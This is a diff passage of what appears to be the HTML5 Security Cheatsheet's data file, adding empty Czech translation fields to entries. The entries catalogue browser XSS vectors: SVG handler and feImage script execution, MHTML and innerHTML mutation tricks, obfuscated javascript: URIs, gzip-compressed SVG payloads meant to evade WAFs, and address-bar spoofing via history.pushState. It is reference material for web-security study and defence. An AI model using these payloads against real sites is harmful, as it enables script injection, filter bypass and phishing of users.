             'ru' : 'В случае предоставления пользователю возможности добавлять стили, убедитесь, что правила белого списка сформированы корректно, чтобы избежать аттак через множественный "url()".',
+            'cs' : '',
             'de' : ''
         },
         'browsers'   : {
@@ -2896,6 +3175,7 @@ var items =
             'en' : 'Using SVG element <handler>',
             'ja' : '',
             'ru' : 'Использование SVG-элемента <handler>',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<svg xmlns="http://www.w3.org/2000/svg">\n<handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">%js_alert%</handler>\n</svg>',        
@@ -2903,6 +3183,7 @@ var items =
             'en' : 'Specification SVG Tiny 1.2 provides an element <handler>, which is a "bridge" between SVG and XML-events. This element can contain regular JavaScript.',
             'ja' : '',
             'ru' : 'Спецификацией SVG Tiny 1.2 предусмотрен элемент <handler>, который является связующим звеном между SVG и XML-events. Этот элемент может заключать в себе обычный JavaScript код.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://www.w3.org/TR/SVGMobile12/script.html#HandlerElement', 'http://www.w3.org/TR/xml-events/', '#84', '#85'],
@@ -2910,6 +3191,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },
         'browsers'   : {
@@ -2925,6 +3207,7 @@ var items =
             'en' : 'Using SVG element <feImage> and animated data URIs',
             'ja' : '',
             'ru' : 'Использование SVG-элемента <feImage> и анимируемого data URIs',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">\n<feImage>\n<set attributeName="xlink:href" to="data:image/svg+xml;charset=utf-8;base64,\nPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/>\n</feImage>\n</svg>',        
@@ -2932,6 +3215,7 @@ var items =
             'en' : 'SVG allows using filter effects to be applied on arbitrary visible SVG elements. The feImage filter allows inclusion of other files - as well as data URIs. With a maliciuosly crafted data URI it\'s possible to execute JavaScript without user interaction. List all of the elements which can be animated can be found in the specified documentation.',
             'ja' : '',
             'ru' : 'SVG поддерживает фильтры, определяемые в отдельном SVG-элементе - <feImage>. Содержание этого элемента может быть загружено из других файлов, а также из data URI. С помощью специально сформированного data URI возможно выполнить JavaScript без взаимодействия с пользователем. Список всех элементов, которые могут быть анимированы, можно найти по приведенным ссылкам.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://www.w3.org/TR/SVG/filters.html', 'http://www.w3.org/TR/SVG11/animate.html#Animatable', 'http://www.w3.org/TR/SVGMobile12/animate.html#Animatable'],
@@ -2939,6 +3223,7 @@ var items =
             'en' : 'Make sure that user submitted SVG data and SVG files are treated as XML documents - not as images. The nature of SVG allows to include almost arbitrary XML data including JavaScript leading to XSS or worse.',
             'ja' : '',
             'ru' : 'Убедитесь, что пользовательские SVG-данные и SVG-файлы проверяются также, как и обычные XML-документы, а не как изображения. Природа SVG позволяет включать почти произвольные XML-данные, в т.ч. JavaScript, открывающий перспективу XSS и т.д.',
+            'cs' : '',
             'de' : ''
         },
         'browsers'   : {
@@ -2954,6 +3239,7 @@ var items =
             'en' : 'JavaScript execution via MHTML-scheme',
             'ja' : '',
             'ru' : 'Исполнение JavaScript с использованием MHTML-схемы.',
+            'cs' : '',
             'de' : ''
         },
         'data'       : 'mhtml:http://heideri.ch/jso/test.html!xss.html\nmhtml:http://heideri.ch/jso/test.gif!xss.html',
@@ -2968,6 +3254,7 @@ var items =
 	    'en' : 'Any content including images (for example GIF comments) may be considered as web-archive in case user input is allowed before the first two new lines. Using this vector all sites that do not contain two new lines in the source code and allows users to insert new line are vulnerable - as well as all sites that allow users to upload images without post-upload conversion etc. A link to this web-archives can be specified via <IFRAME> or location.href and comparable.',
             'ja' : '',
             'ru' : 'Любой формат, включая изображения, может рассматриваться в качестве веб-архива, если пользователь имеет возможность влиять на исходный код сайта до первой пустой строки, или первых двух переводов строк. Этим вектором уязвимы все сайты, которые не содержат пустых строк в исходном коде, обычно добавляемых для читабельности, и позволяют пользователю вставлять символы перевода строки, а также все сайты, которые позволяют пользователям загружать неконвертируемые изображения (пример веб-архива, встроенного в изображение, можно взять из папки attachments : изображение при этом остается полностью действительным) и т.п. Ссылка на архив может быть указана в теге <IFRAME> или с помощью location, или как-либо ещё.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://en.wikipedia.org/wiki/MHTML'],
@@ -2975,6 +3262,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -2990,6 +3278,7 @@ var items =
             'en' : 'XSS using "xmlns" attribute in custom tag when copying innerHTML (2)',
             'ja' : '',
             'ru' : 'XSS с использованием атрибута xmlns в сочетании с пользовательским (custom) тегом при копировании с помощью innerHTML (2)',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<div id=d><x xmlns="><iframe onload=%js_alert%"></div>\n<script>d.innerHTML=d.innerHTML</script>',
@@ -2997,6 +3286,7 @@ var items =
 	    'en' : 'Internet Explorer incorrectly analyzes the attribute "xmlns" in custom tags when copying innerHTML - its parameter is added to the tag <?XML:NAMESPACE> without delimiters.',
             'ja' : '',
             'ru' : 'Internet Explorer неправильно анализирует атибут xmlns в пользовательских тегах при копировании с помощью innerHTML: параметр этого атрибута добавляется в тег <?XML:NAMESPACE> без оганичителей.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['#59','#98'],
@@ -3004,6 +3294,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -3021,6 +3312,7 @@ var items =
             'en' : 'Style injection when copying innerHTML (3)',
             'ja' : '',
             'ru' : 'Стилевая инъекция при копировании с помощью innerHTML (3)',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<div id=d><div style="font-family:\'sans\\27\\3B color\\3Ared\\3B\'">X</div></div>\n<script>with(document.getElementById("d"))innerHTML=innerHTML</script>',
@@ -3028,6 +3320,7 @@ var items =
 	    'en' : 'The example shows that Internet Explorer and Mozilla Firefox automaticaly decode CSS-encoding if the harmless markup is copied using innerHTML.',
             'ja' : '',
             'ru' : 'Пример показывает, как Internet Explorer and Mozilla Firefox автоматически декодируют CSS-кодировку в случае, если на первый взгляд безопасная разметка копируется с помощью innerHTML.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['#59','#97'],
@@ -3035,6 +3328,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -3051,6 +3345,7 @@ var items =
             'en' : 'Using comments to obfuscate styles',
             'ja' : '',
             'ru' : 'Использование комментариев для обфускации стилей',
+            'cs' : '',
             'de' : ''
         },
         'data'       : 'XXX<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>',
@@ -3058,6 +3353,7 @@ var items =
 	    'en' : 'All browsers allow to use CSS-comments before and after the properties and values. In addition, Internet Explorer allows to use comments in values. Also it\'s possible for Internet Explorer and Safari to obfuscate comment inside the tag <STYLE> via unencoded null character.',
             'ja' : '',
             'ru' : 'Все браузеры позволяют использовать CSS-комментарии до и после свойств и их значений. Кроме того, Internet Explorer позволяет использовать комментарии в значениях свойств. Также в Internet Explorer и Safari в теге <STYLE> воспринимается комментарий, обфусцированный с помощью незакодированного нулевого символа.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -3065,6 +3361,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -3084,6 +3381,7 @@ var items =
             'en' : 'HTML separators and ignored characters',
             'ja' : '',
             'ru' : 'Разделители и игнорируемые символы в HTML',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<img[a][b][c]src[d]=x[e]onerror=[f]"%js_alert%">',
@@ -3091,6 +3389,7 @@ var items =
 	    'en' : '[a] Characters* ignored after tag names (and not accepted as tag name/attribute separators).\n\nInternet Explorer, Safari** : 0\nSafari : 47\nFirefox 3.x : 11,12\n\n[b] Characters accepted as tag name/attribute separators.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,13,32\nFirefox 4.x, Internet Explorer, Safari, Google Chrome, Opera : 12\nFirefox, Internet Explorer, Google Chrome, Opera : 47\nInternet Explorer, Safari: 11\n\n[c] Characters ignored before attributes (and not accepted as parameter/attribute separators).\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 47\nFirefox 3.x, Safari : 34,39\nInternet Explorer : 0\n\n[d] Characters ignored between attribute name and equals sign.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,13,32\nFirefox 4.x, Internet Explorer, Safari, Google Chrome, Opera : 12\nSafari, Internet Explorer : 0,11\nSafari : 47\n\n[e] Characters accepted as parameter/attribute separators.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,13,32\nFirefox 4.x, Internet Explorer, Safari, Google Chrome, Opera : 12\nSafari, Internet Explorer : 11\n\n[f] Characters ignored between equals sign and parameter.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,13,32\nFirefox 4.x, Internet Explorer, Safari, Google Chrome, Opera : 12\nSafari, Internet Explorer : 11\nInternet Explorer : 0\n\n* These are given in decimal codes.\n** Null character in Safari is a divider (only the left part of the tag name or attribute name still valid).',
             'ja' : '',
             'ru' : '[a] Символы*, игнорируемые после имени тега (и не являющиеся при этом разделителями имени тега и атрибута).\n\nInternet Explorer, Safari** : 0\nSafari : 47\nFirefox 3.x : 11,12\n\n[b] Символы, воспринимаемые в качестве разделителей имени тега и атрибута.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,13,32\nFirefox 4.x, Internet Explorer, Safari, Google Chrome, Opera : 12\nFirefox, Internet Explorer, Google Chrome, Opera : 47\nInternet Explorer, Safari: 11\n\n[c] Символы, игнорируемые перед атрибутом (и не являющиеся при этом разделителями параметра и атрибута).\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 47\nFirefox 3.x, Safari : 34,39\nInternet Explorer : 0\n\n[d] Симолы, игнорируемые между именем атрибута и знаком равенства.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,13,32\nFirefox 4.x, Internet Explorer, Safari, Google Chrome, Opera : 12\nSafari, Internet Explorer : 0,11\nSafari : 47\n\n[e] Символы, воспринимаемые в качестве разделителей параметра и атрибута.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,13,32\nFirefox 4.x, Internet Explorer, Safari, Google Chrome, Opera : 12\nSafari, Internet Explorer : 11\n\n[f] Символы, игнорируемые между знаком равенства и параметром.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,13,32\nFirefox 4.x, Internet Explorer, Safari, Google Chrome, Opera : 12\nSafari, Internet Explorer : 11\nInternet Explorer : 0\n\n* Приведены в десятичных кодах.\n** Нулевой символ в Safari - это символ-отсекатель (остаётся действительной только левая часть имени тега или параметра).',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://docs.google.com/Doc?docid=0ASCeV1AnDNdWZGQ3eDVzbXdfMTZoZGQzNGdneg', '#106'],
@@ -3098,6 +3397,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -3117,6 +3417,7 @@ var items =
             'en' : 'Characters ignored in the URI (Safari and Google Chrome)',
             'ja' : '',
             'ru' : 'Символы, игнорируемые в URI (Safari and Google Chrome)',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:%js_alert%>XXX</a>',
@@ -3124,6 +3425,7 @@ var items =
 	    'en' : 'This example shows that Google Chrome and Safari ignore the following characters in the URI (excluding 9,10,13) : 1-8,11,12. Also Safari ignores in the URI unencoded null character.',
             'ja' : '',
             'ru' : 'Пример как бы намекает, что Google Chrome и Safari помимо символов с десятичным кодом 9,10,13, игнорируемых в URI всеми браузерами, также игнорирует символы 1-8,11,12. Кроме того, Safari игнорирует в URI незакодированный нулевой символ.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -3131,6 +3433,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -3147,6 +3450,7 @@ var items =
             'en' : 'Forced plaintext via unbalanced quotes in Internet Explorer',
             'ja' : '',
             'ru' : 'Провоцирование текста посредством несбалансированной кавычки в Internet Explorer',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<img src="x` `<script>%js_alert%</script>"` `>',
@@ -3154,6 +3458,7 @@ var items =
             'en' : 'Internet Explorer treats any tag as plaintext in case the attribute delimiters are unbalanced - in this example caused by the ` `. In unbalanced quotes appear inside or outside an attributes - preceded by an arbitrary character but the equals sign - the usage of HTML inside attributes is possible and the content will be rendered as regular HTML. The problem has been reported and will be taken care of in later versions of the Internet Explorer.',
             'ja' : '',
             'ru' : 'Internet Explorer рассматривает любой тег в качестве текстового содержимого в случае, если ограничители атрибута несбалансированы. В данном случае это достигается с помощью двух обратных апострофов вне формального атрибута, один из которых (добавлен с целью соблюдения чётности ограничителей) нейтрализован рядом стоящим символом, а другой выполняет функцию разбалансировки формального тега <IMG>. В результате этого тег <IMG> разбирается браузером как текст, а содержимое атрибута src, наоборот, как HTML.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['#62', '#108'],
@@ -3161,6 +3466,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -3176,6 +3482,7 @@ var items =
             'en' : 'Spoofing the address bar information with history.pushState()',
             'ja' : '',
             'ru' : 'Спуфинг информации в адрессной строке с помощью history.pushState()',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<script>history.pushState(0,0,\'/i/am/somewhere_else\');</script>',
@@ -3183,6 +3490,7 @@ var items =
             'en' : 'The history.pushState() and history.replaceState() API allows to create and modify the user\'s history. An attacker can use this feature to change the information displayed in the address bar as well as the location DOM object and thus initiate phishing attacks or obfuscate bad intentions. The information shown in the address bar cannot be trusted anymore as soon as an attacker or a malicious website execute JavaScript.',
             'ja' : '',
             'ru' : 'Методы history.pushState() и history.replaceState() позволяют создавать и модифицировать историю посещений пользователя. Атакующий может использовать эти возможности для изменения информации, отображаемой в адресной строке, а также DOM-объекта location. Это может быть использовано в частности в фишинг-атаках. Информация, отраженная в адресной строке, больше не сможет рассматриваться в качестве верной, как только атакующий получит возможность исполнить JavaScript.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://www.whatwg.org/specs/web-apps/current-work/multipage/history.html'],
@@ -3190,6 +3498,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -3206,6 +3515,7 @@ var items =
             'en' : ' Executing JavaScript in SVG Tiny 1.2 without user interaction',
             'ja' : '',
             'ru' : 'Активный скриптинг в SVG Tiny 1.2',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<svg xmlns="http://www.w3.org/2000/svg" id="foo">\r\n<x xmlns="http://www.w3.org/2001/xml-events" event="load" observer="foo" handler="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E %js_alert% %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar"/>\r\n</svg>',
@@ -3213,6 +3523,7 @@ var items =
             'en' : 'Opera - providing advanced support for SVG Tiny 1.2 targeting mobile devices - allows to execute JavaScript without user interaction via arbitrary tags. The tag is being applied with a handler pointing to a data URI containing the actual handler. Important is the hash at the end of the data URI to identify the corrrect handler. It is also possible to refer to an element contained in the SVG by its ID or an external resource.',
             'ja' : '',
             'ru' : 'Пример демонстрирует применение XML-events в SVG. Собственно всё, кроме полезной нагрузки атрибута handler, прямого отношения к SVG не имеет и может быть использовано в любом XML-контексте. В атрибуте handler можно сослаться как на внешний источник, так и на элемент, содержащийся в текущем документе по его ID.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://www.w3.org/TR/SVGMobile12/script.html', 'http://www.w3.org/TR/2003/REC-xml-events-20031014/', '#84', '#85'],
@@ -3220,6 +3531,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -3235,6 +3547,7 @@ var items =
             'en' : ' SVG payload obfuscation with gzipped HTML and MIME type image/svg-xml',
             'ja' : '',
             'ru' : 'Обфускация полезной SVG-нагрузки с помощью HTML-разметки, сжатой gzip, и MIME-типа image/svg-xml',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>',
@@ -3242,6 +3555,7 @@ var items =
             'en' : 'Opera allows displaying compressed SVG images without the usually necessary encoding header. This works for almost arbitrary data as long as the content type image/svg+xml is set - or image/svg-xml like in this example.\r\n\r\nNotice that the compressed data can be truncated. Opera will still accept it and render the <script> tag and execute the alert(1) - most other Gzip parsers will break though - rendering any WAF or similar tool trying to analyze the payload useless (gzip 1.3.12 states the payload contains 50+ MB of binary gibberish).\r\n\r\nThe example contains no actual SVG code - just a regular <script> tag with a XHTML namespace attribute.',
             'ja' : '',
             'ru' : 'Opera отображает сжатое SVG-изображение без обычно необходимого заголовка encoding. Этот приём работает в отношении практически любых удаленных данных, если установлен тип содержимого image/svg+xml или, как в данном случае, image/svg-xml.\r\n\r\nОбратите внимание, что удаленные данные могут быть искажены. Opera все равно примет их, распознает тег <script> и исполнит его содержимое (хотя большинство других Gzip-парсеров сломается). Попытки любых WAF и тому подобных программ проанализировать полезную нагрузку на данный момент потерпят неудачу (gzip 1.3.12 устанавливает размер возможной полезной нагрузки в 50+ МВ).\r\n\r\nПример не содержит ожидаемого SVG-кода: только обычный тег <script> с пространством имен XHTML.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://www.w3.org/TR/2002/CR-SVG11-20020430/minimize.html'],
@@ -3249,6 +3563,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -3264,6 +3579,7 @@ var items =
             'en' : 'Safari attribute ofuscation with slashes and quotes',
             'ja' : '',
             'ru' : 'Обфускация атрибута в Safari с использованием слешей и кавычек',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<img src onerror /" \'"= alt=%js_alert%//">',
@@ -3271,6 +3587,7 @@ var items =
             'en' : 'Safari accepts slashes and quotes (if preceded by whitespace, slashes or other quotes) between attribute names and the equals character (name/"\'=value). This enables interesting possibilities to obfuscate HTML strings, bypass filters and mimick attributes like in the given example.',
             'ja' : '',
             'ru' : 'Safari игнорирует слеши и кавычки (если им предшествует пробельный символ, слеш или другая кавычка) между именем атрибута и знаком равенства. Это открывает интересные возможности обфусцировать HTML, обойти фильтр, внешне замаскировав атрибут, как в приведенном примере.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -3278,6 +3595,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -3293,6 +3611,7 @@ var items =
             'en' : 'JavaScript execution via title tag on Inernet Explorer 9',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<title onpropertychange=alert(1)></title><title title=>',
@@ -3300,6 +3619,7 @@ var items =
             'en' : 'Internet Explorer 9 allows execution of JavaScript via onpropertychange event handler on <title> tags if another <title> tag follows up - having at least one valid attribute.',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -3307,6 +3627,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -3322,6 +3643,7 @@ var items =
             'en' : 'Internet Explorer parameter parsing issue',
             'ja' : '',
             'ru' : 'Парсинг параметров в Internet Explorer',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=%js_alert%></a>">',
@@ -3329,6 +3651,7 @@ var items =
             'en' : 'Internet Explorer treats the sequence of any quotes that follows the equal sign in a parameter without delimiters as the beginning of a new parameter.',
             'ja' : '',
             'ru' : 'Internet Explorer рассматривает последовательность из любой кавычки, следующей за знаком равенства, внутри параметра без явно указанных ограничителей как начало нового параметра.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['#62','#102'],
@@ -3336,6 +3659,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -3351,6 +3675,7 @@ var items =
             'en' : ' SVG JavaScript execution via style injection (1) ',
             'ja' : '',
             'ru' : 'Исполнение JavaScript в SVG c помощью стилевой инъекции (1)',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<svg xmlns="http://www.w3.org/2000/svg">\n<a id="x"><rect fill="white" width="1000" height="1000"/></a>\n<rect  fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/>\n</svg>',
@@ -3365,6 +3690,7 @@ var items =
             'en' : 'SVG supports several new CSS properties (clip-path, fill, filter, marker, marker-end, marker-mid, marker-start, mask, stroke), which can refer to external SVG-resources. These properties can also act as separate attributes. Within the external SVG can contain information to animate the current SVG-document. Example shows an animation links, but the possibilities of animation and other elements. Note that Opera does not show the user the change of links address, if the cursor does not go beyond it.',
             'ja' : '',
             'ru' : 'SVG поддерживает несколько новых CSS-свойств (clip-path, fill, filter, marker, marker-end, marker-mid, marker-start, mask, stroke), которые могут ссылаться на внешние SVG-ресурсы. Эти свойства также могут выступать в качестве самостоятельных атрибутов. Внутри внешнего SVG может содержаться информация для анимирования действующего SVG-документа. Пример демонстрирует анимацию ссылки, но возможна также и анимация других элементов. Обратите внимание, что Opera не покажет изменение адреса ссылки, если курсор не выйдет за пределы её действия.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [''],
@@ -3372,6 +3698,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -3387,6 +3714,7 @@ var items =
             'en' : ' SVG JavaScript execution via style injection (2) ',
             'ja' : '',
             'ru' : 'Исполнение JavaScript в SVG c помощью стилевой инъекции (2)',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<svg xmlns="http://www.w3.org/2000/svg">\n\n<path d="M0,0" style="marker-start:url(test4.svg#a)"/>\n\n</svg>',
@@ -3401,6 +3729,7 @@ var items =
             'en' : 'This example shows how the property "marker" allows to insert into the current document is an external link with JavaScript: URL.',
             'ja' : '',
             'ru' : 'Показано, как свойство marker позволяет вставлять в текущий документ внешнюю ссылку с псевдоскриптом в качестве URL.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -3408,6 +3737,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
